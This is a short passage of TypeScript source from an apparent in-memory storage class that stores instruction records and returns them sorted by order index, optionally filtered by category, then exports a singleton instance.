      codeExample: insertInstruction.codeExample || null,
    };
    this.instructions.set(id, instruction);
    return instruction;
  }

  async getInstructions(): Promise<Instruction[]> {
    return Array.from(this.instructions.values()).sort((a, b) => a.orderIndex - b.orderIndex);
  }

  async getInstructionsByCategory(category: string): Promise<Instruction[]> {
    return Array.from(this.instructions.values())
      .filter((i) => i.category === category)
      .sort((a, b) => a.orderIndex - b.orderIndex);
  }
}

export const storage = new MemStorage();
